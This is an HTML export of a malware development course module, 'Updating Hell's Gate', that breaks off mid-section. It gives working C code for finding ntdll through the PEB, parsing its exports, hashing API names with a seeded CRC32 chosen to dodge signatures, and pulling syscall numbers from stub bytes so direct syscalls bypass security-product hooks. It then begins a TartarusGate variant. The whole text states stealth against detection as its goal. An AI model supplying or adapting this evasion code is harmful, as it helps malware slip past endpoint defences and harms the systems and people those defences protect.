<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>88. Updating Hell&#x27;s Gate</title><style>
/* cspell:disable-file */
/* webkit printing magic: print all background colors */
html {
	-webkit-print-color-adjust: exact;
}
* {
	box-sizing: border-box;
	-webkit-print-color-adjust: exact;
}

html,
body {
	margin: 0;
	padding: 0;
}
@media only screen {
	body {
		margin: 2em auto;
		max-width: 900px;
		color: rgb(55, 53, 47);
	}
}

body {
	line-height: 1.5;
	white-space: pre-wrap;
}

a,
a.visited {
	color: inherit;
	text-decoration: underline;
}

.pdf-relative-link-path {
	font-size: 80%;
	color: #444;
}

h1,
h2,
h3 {
	letter-spacing: -0.01em;
	line-height: 1.2;
	font-weight: 600;
	margin-bottom: 0;
}

.page-title {
	font-size: 2.5rem;
	font-weight: 700;
	margin-top: 0;
	margin-bottom: 0.75em;
}

h1 {
	font-size: 1.875rem;
	margin-top: 1.875rem;
}

h2 {
	font-size: 1.5rem;
	margin-top: 1.5rem;
}

h3 {
	font-size: 1.25rem;
	margin-top: 1.25rem;
}

.source {
	border: 1px solid #ddd;
	border-radius: 3px;
	padding: 1.5em;
	word-break: break-all;
}

.callout {
	border-radius: 3px;
	padding: 1rem;
}

figure {
	margin: 1.25em 0;
	page-break-inside: avoid;
}

figcaption {
	opacity: 0.5;
	font-size: 85%;
	margin-top: 0.5em;
}

mark {
	background-color: transparent;
}

.indented {
	padding-left: 1.5em;
}

hr {
	background: transparent;
	display: block;
	width: 100%;
	height: 1px;
	visibility: visible;
	border: none;
	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
}

img {
	max-width: 100%;
}

@media only print {
	img {
		max-height: 100vh;
		object-fit: contain;
	}
}

@page {
	margin: 1in;
}

.collection-content {
	font-size: 0.875rem;
}

.column-list {
	display: flex;
	justify-content: space-between;
}

.column {
	padding: 0 1em;
}

.column:first-child {
	padding-left: 0;
}

.column:last-child {
	padding-right: 0;
}

.table_of_contents-item {
	display: block;
	font-size: 0.875rem;
	line-height: 1.3;
	padding: 0.125rem;
}

.table_of_contents-indent-1 {
	margin-left: 1.5rem;
}

.table_of_contents-indent-2 {
	margin-left: 3rem;
}

.table_of_contents-indent-3 {
	margin-left: 4.5rem;
}

.table_of_contents-link {
	text-decoration: none;
	opacity: 0.7;
	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
}

table,
th,
td {
	border: 1px solid rgba(55, 53, 47, 0.09);
	border-collapse: collapse;
}

table {
	border-left: none;
	border-right: none;
}

th,
td {
	font-weight: normal;
	padding: 0.25em 0.5em;
	line-height: 1.5;
	min-height: 1.5em;
	text-align: left;
}

th {
	color: rgba(55, 53, 47, 0.6);
}

ol,
ul {
	margin: 0;
	margin-block-start: 0.6em;
	margin-block-end: 0.6em;
}

li > ol:first-child,
li > ul:first-child {
	margin-block-start: 0.6em;
}

ul > li {
	list-style: disc;
}

ul.to-do-list {
	padding-inline-start: 0;
}

ul.to-do-list > li {
	list-style: none;
}

.to-do-children-checked {
	text-decoration: line-through;
	opacity: 0.375;
}

ul.toggle > li {
	list-style: none;
}

ul {
	padding-inline-start: 1.7em;
}

ul > li {
	padding-left: 0.1em;
}

ol {
	padding-inline-start: 1.6em;
}

ol > li {
	padding-left: 0.2em;
}

.mono ol {
	padding-inline-start: 2em;
}

.mono ol > li {
	text-indent: -0.4em;
}

.toggle {
	padding-inline-start: 0em;
	list-style-type: none;
}

/* Indent toggle children */
.toggle > li > details {
	padding-left: 1.7em;
}

.toggle > li > details > summary {
	margin-left: -1.1em;
}

.selected-value {
	display: inline-block;
	padding: 0 0.5em;
	background: rgba(206, 205, 202, 0.5);
	border-radius: 3px;
	margin-right: 0.5em;
	margin-top: 0.3em;
	margin-bottom: 0.3em;
	white-space: nowrap;
}

.collection-title {
	display: inline-block;
	margin-right: 1em;
}

.simple-table {
	margin-top: 1em;
	font-size: 0.875rem;
	empty-cells: show;
}
.simple-table td {
	height: 29px;
	min-width: 120px;
}

.simple-table th {
	height: 29px;
	min-width: 120px;
}

.simple-table-header-color {
	background: rgb(247, 246, 243);
	color: black;
}
.simple-table-header {
	font-weight: 500;
}

time {
	opacity: 0.5;
}

.icon {
	display: inline-block;
	max-width: 1.2em;
	max-height: 1.2em;
	text-decoration: none;
	vertical-align: text-bottom;
	margin-right: 0.5em;
}

img.icon {
	border-radius: 3px;
}

.user-icon {
	width: 1.5em;
	height: 1.5em;
	border-radius: 100%;
	margin-right: 0.5rem;
}

.user-icon-inner {
	font-size: 0.8em;
}

.text-icon {
	border: 1px solid #000;
	text-align: center;
}

.page-cover-image {
	display: block;
	object-fit: cover;
	width: 100%;
	max-height: 30vh;
}

.page-header-icon {
	font-size: 3rem;
	margin-bottom: 1rem;
}

.page-header-icon-with-cover {
	margin-top: -0.72em;
	margin-left: 0.07em;
}

.page-header-icon img {
	border-radius: 3px;
}

.link-to-page {
	margin: 1em 0;
	padding: 0;
	border: none;
	font-weight: 500;
}

p > .user {
	opacity: 0.5;
}

td > .user,
td > time {
	white-space: nowrap;
}

input[type="checkbox"] {
	transform: scale(1.5);
	margin-right: 0.6em;
	vertical-align: middle;
}

p {
	margin-top: 0.5em;
	margin-bottom: 0.5em;
}

.image {
	border: none;
	margin: 1.5em 0;
	padding: 0;
	border-radius: 0;
	text-align: center;
}

.code,
code {
	background: rgba(135, 131, 120, 0.15);
	border-radius: 3px;
	padding: 0.2em 0.4em;
	border-radius: 3px;
	font-size: 85%;
	tab-size: 2;
}

code {
	color: #eb5757;
}

.code {
	padding: 1.5em 1em;
}

.code-wrap {
	white-space: pre-wrap;
	word-break: break-all;
}

.code > code {
	background: none;
	padding: 0;
	font-size: 100%;
	color: inherit;
}

blockquote {
	font-size: 1.25em;
	margin: 1em 0;
	padding-left: 1em;
	border-left: 3px solid rgb(55, 53, 47);
}

.bookmark {
	text-decoration: none;
	max-height: 8em;
	padding: 0;
	display: flex;
	width: 100%;
	align-items: stretch;
}

.bookmark-title {
	font-size: 0.85em;
	overflow: hidden;
	text-overflow: ellipsis;
	height: 1.75em;
	white-space: nowrap;
}

.bookmark-text {
	display: flex;
	flex-direction: column;
}

.bookmark-info {
	flex: 4 1 180px;
	padding: 12px 14px 14px;
	display: flex;
	flex-direction: column;
	justify-content: space-between;
}

.bookmark-image {
	width: 33%;
	flex: 1 1 180px;
	display: block;
	position: relative;
	object-fit: cover;
	border-radius: 1px;
}

.bookmark-description {
	color: rgba(55, 53, 47, 0.6);
	font-size: 0.75em;
	overflow: hidden;
	max-height: 4.5em;
	word-break: break-word;
}

.bookmark-href {
	font-size: 0.75em;
	margin-top: 0.25em;
}

.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.highlight-default {
	color: rgba(55, 53, 47, 1);
}
.highlight-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.highlight-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.highlight-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.highlight-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.highlight-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.highlight-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.highlight-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.highlight-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.highlight-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.highlight-gray_background {
	background: rgba(241, 241, 239, 1);
}
.highlight-brown_background {
	background: rgba(244, 238, 238, 1);
}
.highlight-orange_background {
	background: rgba(251, 236, 221, 1);
}
.highlight-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.highlight-teal_background {
	background: rgba(237, 243, 236, 1);
}
.highlight-blue_background {
	background: rgba(231, 243, 248, 1);
}
.highlight-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.highlight-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.highlight-red_background {
	background: rgba(253, 235, 236, 1);
}
.block-color-default {
	color: inherit;
	fill: inherit;
}
.block-color-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.block-color-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.block-color-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.block-color-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.block-color-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.block-color-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.block-color-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.block-color-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.block-color-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.block-color-gray_background {
	background: rgba(241, 241, 239, 1);
}
.block-color-brown_background {
	background: rgba(244, 238, 238, 1);
}
.block-color-orange_background {
	background: rgba(251, 236, 221, 1);
}
.block-color-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.block-color-teal_background {
	background: rgba(237, 243, 236, 1);
}
.block-color-blue_background {
	background: rgba(231, 243, 248, 1);
}
.block-color-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.block-color-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.block-color-red_background {
	background: rgba(253, 235, 236, 1);
}
.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
.select-value-color-translucentGray { background-color: rgba(255, 255, 255, 0.0375); }
.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }

.checkbox {
	display: inline-flex;
	vertical-align: text-bottom;
	width: 16;
	height: 16;
	background-size: 16px;
	margin-left: 2px;
	margin-right: 5px;
}

.checkbox-on {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
}

.checkbox-off {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
}
	
</style></head><body><article id="fe071448-7128-4371-a5c3-1d710c3c2a4f" class="page sans"><header><h1 class="page-title"><a href="https://maldevacademy.com/modules/88"><strong>88. Updating Hell&#x27;s Gate</strong></a></h1></header><div class="page-body"><h2 id="02930436-339c-4881-b68e-6bc7f0506677" class=""><strong>Updating Hell&#x27;s Gate</strong></h2><h3 id="baca93f5-be12-4d67-ac14-8d982c137125" class=""><strong>Introduction</strong></h3><p id="0af09e61-8412-47cf-9ee8-1a5de907142a" class="">The <em>Syscalls - Hell&#x27;s Gate</em> module introduced the Hell&#x27;s Gate technique, which bypasses userland hooks by searching for the syscall number in the hook bytes to be used later as a directly called syscall. This module updates the original Hell&#x27;s Gate implementation that was demonstrated in that module.</p><p id="38796ac5-9d2d-404d-88d1-0a7f39d5c7e0" class="">The updates will make the implementation more custom and as a result, make it more stealthy and reduce signature-based detection. Additionally, the updated code will change the way the implementation retrieves a syscall&#x27;s SSN by using <a href="https://github.com/trickster0/TartarusGate">TartarusGate&#x27;s</a> approach.</p><p id="64e0502b-82b0-4633-b654-5ba88be5c17c" class="">If you require a refresher on the original Hell&#x27;s Gate implementation, visit the <a href="https://github.com/am0nsec/HellsGate">Hell&#x27;s Gate GitHub repository</a>.</p><h3 id="efe3909f-b11c-403e-95d1-67019ef0c9e0" class=""><strong>Updating The String Hashing Algorithm</strong></h3><p id="be544345-67db-4ecf-9e43-d19683b26375" class="">The original Hell&#x27;s Gate implementation used the <a href="https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c#L92">DJB2</a> string hashing algorithm. Updating the string hashing algorithm does not affect the Hell&#x27;s Gate implementation, but modifying the string hashing algorithm will likely reduce the likelihood of signature detection. The <code>djb2</code> function is replaced with the following function.</p><pre id="78ff73ce-719d-4f94-a1f5-7e3cd7ff7cc1" class="code code-wrap"><code>unsigned int crc32h(char* message) {
    int i, crc;
    unsigned int byte, c;
    const unsigned int g0 = SEED, g1 = g0 &gt;&gt; 1,
        g2 = g0 &gt;&gt; 2, g3 = g0 &gt;&gt; 3, g4 = g0 &gt;&gt; 4, g5 = g0 &gt;&gt; 5,
        g6 = (g0 &gt;&gt; 6) ^ g0, g7 = ((g0 &gt;&gt; 6) ^ g0) &gt;&gt; 1;

    i = 0;
    crc = 0xFFFFFFFF;
    while ((byte = message[i]) != 0) {    // Get next byte.
        crc = crc ^ byte;
        c = ((crc &lt;&lt; 31 &gt;&gt; 31) &amp; g7) ^ ((crc &lt;&lt; 30 &gt;&gt; 31) &amp; g6) ^
            ((crc &lt;&lt; 29 &gt;&gt; 31) &amp; g5) ^ ((crc &lt;&lt; 28 &gt;&gt; 31) &amp; g4) ^
            ((crc &lt;&lt; 27 &gt;&gt; 31) &amp; g3) ^ ((crc &lt;&lt; 26 &gt;&gt; 31) &amp; g2) ^
            ((crc &lt;&lt; 25 &gt;&gt; 31) &amp; g1) ^ ((crc &lt;&lt; 24 &gt;&gt; 31) &amp; g0);
        crc = ((unsigned)crc &gt;&gt; 8) ^ c;
        i = i + 1;
    }
    return ~crc;
}
</code></pre><p id="64667c14-b7f3-4b5b-9a1a-2e0848bd7261" class="">The <code>crc32h</code> function is an implementation of the <a href="https://en.wikipedia.org/wiki/Cyclic_redundancy_check">Cyclic Redundancy Check</a> string hashing algorithm and will be used in this module. To promote code readability and maintainability, the <code>crc32h</code> function will be called through the following macro.</p><pre id="6bfb613d-a792-455c-bb1b-12b38434f655" class="code code-wrap"><code>#define HASH(API) crc32h((char*)API)</code></pre><p id="33c0a5d2-7ed5-4640-9868-c41149b4fe2b" class="">Where the <code>API</code> variable is the string to hash using <code>crc32h</code>.</p><h3 id="59777878-04dc-48be-be18-affd7dae56dd" class=""><strong>Updating GetVxTableEntry</strong></h3><h3 id="77bad800-0f4b-4cae-a2eb-8152b8111e80" class=""><strong>Creating The NTDLL_CONFIG Structure</strong></h3><p id="1423058c-eb1d-4d9c-9ba0-979b40b1221f" class="">Recall that <a href="https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c#L120">GetVxTableEntry</a> is the function used to retrieve the address and SSN of a specified syscall using its hash. The <code>GetVxTableEntry</code> function calculates the required RVAs to search for the specified hash and takes two additional parameters, <code>pModuleBase</code> and <code>pImageExportDirectory</code>, which are not related to its purpose. To improve efficiency, the <code>NTDLL_CONFIG</code> structure is created and shown below.</p><pre id="7f7616e1-d21d-48ea-9e7c-cafda9e043ce" class="code code-wrap"><code>typedef struct _NTDLL_CONFIG
{
    PDWORD      pdwArrayOfAddresses; // The VA of the array of addresses of ntdll&#x27;s exported functions
    PDWORD      pdwArrayOfNames;     // The VA of the array of names of ntdll&#x27;s exported functions
    PWORD       pwArrayOfOrdinals;   // The VA of the array of ordinals of ntdll&#x27;s exported functions
    DWORD       dwNumberOfNames;     // The number of exported functions from ntdll.dll
    ULONG_PTR   uModule;             // The base address of ntdll - requred to calculated future RVAs

}NTDLL_CONFIG, *PNTDLL_CONFIG;

// global variable
NTDLL_CONFIG g_NtdllConf = { 0 };
</code></pre><h3 id="c271c2bb-0a13-4f86-8a99-98263330a912" class=""><strong>Creating InitNtdllConfigStructure</strong></h3><p id="85a71c13-4880-4f1b-9b2a-db3a679bdc2a" class="">Furthermore, a private function, <code>InitNtdllConfigStructure</code>, is created and called by <code>GetVxTableEntry</code> in order to initialize the <code>g_NtdllConf</code> global structure. This allows <code>GetVxTableEntry</code> to access values from inside NTDLL&#x27;s headers without requiring additional parameters or calculations each time. As a result, <code>InitNtdllConfigStructure</code> initializes the <code>g_NtdllConf</code> structure for future usage.</p><p id="e25eb286-6602-41b0-95af-a9237d080df8" class="">The <code>InitNtdllConfigStructure</code> function fetches the NTDLL base address and performs PE parsing to retrieve the export directory structure. The function then calculates the necessary RVAs to fill the <code>g_NtdllConf</code> structure with the required data. The function returns <code>TRUE</code> if it succeeds in performing these actions and <code>FALSE</code> if <code>g_NtdllConf</code> still contains uninitialized elements.</p><pre id="965771a9-0068-4720-8812-4ed626a3203d" class="code code-wrap"><code>BOOL InitNtdllConfigStructure() {

    // getting peb
    PPEB pPeb = (PPEB)__readgsqword(0x60);
    if (!pPeb || pPeb-&gt;OSMajorVersion != 0xA)
        return FALSE;

    // getting ntdll.dll module (skipping our local image element)
    PLDR_DATA_TABLE_ENTRY pLdr = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb-&gt;LoaderData-&gt;InMemoryOrderModuleList.Flink-&gt;Flink - 0x10);

    // getting ntdll&#x27;s base address
    ULONG_PTR uModule = (ULONG_PTR)(pLdr-&gt;DllBase);
    if (!uModule)
        return FALSE;

    // fetching the dos header of ntdll
    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)uModule;
    if (pImgDosHdr-&gt;e_magic != IMAGE_DOS_SIGNATURE)
        return FALSE;

    // fetching the nt headers of ntdll
    PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(uModule + pImgDosHdr-&gt;e_lfanew);
    if (pImgNtHdrs-&gt;Signature != IMAGE_NT_SIGNATURE)
        return FALSE;

    // fetching the export directory of ntdll
    PIMAGE_EXPORT_DIRECTORY pImgExpDir = (PIMAGE_EXPORT_DIRECTORY)(uModule + pImgNtHdrs-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    if (!pImgExpDir)
        return FALSE;

    // initalizing the &#x27;g_NtdllConf&#x27; structure&#x27;s element
    g_NtdllConf.uModule             = uModule;
    g_NtdllConf.dwNumberOfNames     = pImgExpDir-&gt;NumberOfNames;
    g_NtdllConf.pdwArrayOfNames     = (PDWORD)(uModule + pImgExpDir-&gt;AddressOfNames);
    g_NtdllConf.pdwArrayOfAddresses = (PDWORD)(uModule + pImgExpDir-&gt;AddressOfFunctions);
    g_NtdllConf.pwArrayOfOrdinals   = (PWORD)(uModule  + pImgExpDir-&gt;AddressOfNameOrdinals);

    // checking
    if (!g_NtdllConf.uModule || !g_NtdllConf.dwNumberOfNames || !g_NtdllConf.pdwArrayOfNames || !g_NtdllConf.pdwArrayOfAddresses || !g_NtdllConf.pwArrayOfOrdinals)
        return FALSE;
    else
        return TRUE;
}
</code></pre><h3 id="f26ae2ff-0c43-4815-a669-5d06404840a3" class=""><strong>Renaming &amp; Updating GetVxTableEntry</strong></h3><p id="2f71c05a-4e1d-4855-9f2f-a8d1b09f062b" class=""><code>GetVxTableEntry</code> is renamed to <code>FetchNtSyscall</code> and will have two parameters: <code>dwSysHash</code>, the hash value of the specified syscall to fetch the SSN for and <code>pNtSys</code>, a pointer to an <code>NT_SYSCALL</code> structure which contains everything required to perform a direct syscall. This structure will be initialized by <code>FetchNtSyscall</code>.</p><pre id="cda79067-3708-41d7-89d2-eeebf88a6c46" class="code code-wrap"><code>typedef struct _NT_SYSCALL
{
	DWORD dwSSn;                    // syscall number
	DWORD dwSyscallHash;            // syscall hash value
	PVOID pSyscallAddress;          // syscall address

}NT_SYSCALL, *PNT_SYSCALL;
</code></pre><p id="8e8553e9-affa-4964-89ca-f37b8c4f9f5d" class="">The <code>FetchNtSyscall</code> function does the following:</p><ul id="10fcc534-046b-466d-a6ff-5274f812168e" class="bulleted-list"><li style="list-style-type:disc">Checks if the global <code>g_NtdllConf</code> structure is initialized. If not, it calls <code>InitNtdllConfigStructure</code> to do so.</li></ul><ul id="1f4bd3ea-5ad9-4159-9875-5fba1c542a2e" class="bulleted-list"><li style="list-style-type:disc">Checks if the user specified a hash value, if not it returns <code>FALSE</code>.</li></ul><ul id="67381757-f63f-4c8c-8bb3-e2c867a359a0" class="bulleted-list"><li style="list-style-type:disc">Initiates a for-loop to search for the specified syscall using its hash.</li></ul><ul id="e4e6f6f9-0b08-42d5-95b2-328d6547286a" class="bulleted-list"><li style="list-style-type:disc">When the syscall is found, it saves its address into the <code>pNtSys</code> structure.</li></ul><ul id="112d3828-d521-4abe-aa1b-4fc65790edf4" class="bulleted-list"><li style="list-style-type:disc">It then initiates a while-loop that searches for the SSN of the syscall. The search logic is the same as the original implementation.</li></ul><ul id="b38d56ab-a26f-4593-b168-99a40e0be12a" class="bulleted-list"><li style="list-style-type:disc">If the SSN is found, it&#x27;s saved into the <code>pNtSys</code> structure.</li></ul><ul id="1f560e3c-c239-4124-b657-484fb155f55c" class="bulleted-list"><li style="list-style-type:disc">The function then breaks out of both loops and performs a final check to ensure that all the members of the <code>NT_SYSCALL</code> structure are initialized.</li></ul><ul id="84c9cc53-3996-49b6-8076-2042543fa68e" class="bulleted-list"><li style="list-style-type:disc">The result is returned upon this check.</li></ul><pre id="4b55c258-b48d-4f25-b523-595bdc59a4df" class="code code-wrap"><code>BOOL FetchNtSyscall(IN DWORD dwSysHash, OUT PNT_SYSCALL pNtSys) {

    // initialize ntdll config if not found
    if (!g_NtdllConf.uModule) {
        if (!InitNtdllConfigStructure())
            return FALSE;
    }

    // if no hash value was specified
    if (dwSysHash != NULL)
        pNtSys-&gt;dwSyscallHash = dwSysHash;
    else
        return FALSE;

    // searching for &#x27;dwSysHash&#x27; in the exported functions of ntdll
    for (size_t i = 0; i &lt; g_NtdllConf.dwNumberOfNames; i++) {

        PCHAR pcFuncName   = (PCHAR)(g_NtdllConf.uModule + g_NtdllConf.pdwArrayOfNames[i]);
        PVOID pFuncAddress = (PVOID)(g_NtdllConf.uModule + g_NtdllConf.pdwArrayOfAddresses[g_NtdllConf.pwArrayOfOrdinals[i]]);

        // if syscall found
        if (HASH(pcFuncName) == dwSysHash) {

            // save the address
            pNtSys-&gt;pSyscallAddress = pFuncAddress;

            WORD cw = 0;

            // search for the ssn
            while (TRUE) {

                // reached &#x27;ret&#x27; instruction - we are so far down
                if (*((PBYTE)pFuncAddress + cw) == 0xC3 &amp;&amp; !pNtSys-&gt;dwSSn)
                    return FALSE;

                // reached &#x27;syscall&#x27; instruction - we are so far down
                if (*((PBYTE)pFuncAddress + cw) == 0x0F &amp;&amp; *((PBYTE)pFuncAddress + cw + 1) == 0x05 &amp;&amp; !pNtSys-&gt;dwSSn)
                    return FALSE;

                if (*((PBYTE)pFuncAddress + cw) == 0x4C
                    &amp;&amp; *((PBYTE)pFuncAddress + 1 + cw) == 0x8B
                    &amp;&amp; *((PBYTE)pFuncAddress + 2 + cw) == 0xD1
                    &amp;&amp; *((PBYTE)pFuncAddress + 3 + cw) == 0xB8
                    &amp;&amp; *((PBYTE)pFuncAddress + 6 + cw) == 0x00
                    &amp;&amp; *((PBYTE)pFuncAddress + 7 + cw) == 0x00) {

                    BYTE high = *((PBYTE)pFuncAddress + 5 + cw);
                    BYTE low = *((PBYTE)pFuncAddress + 4 + cw);
                    // save the ssn
                    pNtSys-&gt;dwSSn = (high &lt;&lt; 8) | low;
                    break; // break while-loop
                }

                cw++;
            }

            break; // break for-loop
        }
    }

    // checking if all NT_SYSCALL&#x27;s (pNtSys) element are initialized
    if (pNtSys-&gt;dwSSn != NULL &amp;&amp; pNtSys-&gt;pSyscallAddress != NULL &amp;&amp; pNtSys-&gt;dwSyscallHash != NULL)
        return TRUE;
    else
        return FALSE;
}
</code></pre><h3 id="9b4816b3-d181-4b43-8208-700b3287cfd9" class=""><strong>Enhancing SSN Retrieval Logic</strong></h3><p id="6df16f4b-4c8a-400a-bf9f-89a0fb797a8a" class="">Recall when Hell&#x27;s Gate searches for an SSN, it limits the search boundary by checking for the <code>syscall</code> or <code>ret</code> instructions. If one of these instructions is found and the SSN has not yet been obtained, the search fails, preventing the retrieval of a wrong SSN value of another syscall function.</p><figure id="acf9d257-b483-4ab2-a065-c557190a6ba3" class="image"><a href="88%20Updating%20Hell&#x27;s%20Gate%20fe07144871284371a5c31d710c3c2a4f/hellsgate-update-118970171-6a388cdf-2e50-4441-8013-d4fb0afcd03a.png"><img style="width:794px" src="88%20Updating%20Hell&#x27;s%20Gate%20fe07144871284371a5c31d710c3c2a4f/hellsgate-update-118970171-6a388cdf-2e50-4441-8013-d4fb0afcd03a.png"/></a></figure><h3 id="f0ecf50b-214f-4c99-8067-674802443f9b" class=""><strong>TartarusGate</strong></h3><p id="0492fdc1-84d7-436f-9a6a-17762861103d" class="">There is an alternative way of searching for the SSN that was introduced in <a href="https://github.com/trickster0/TartarusGate">TartarusGate</a>, which is illustrated in the image below.</p><figure 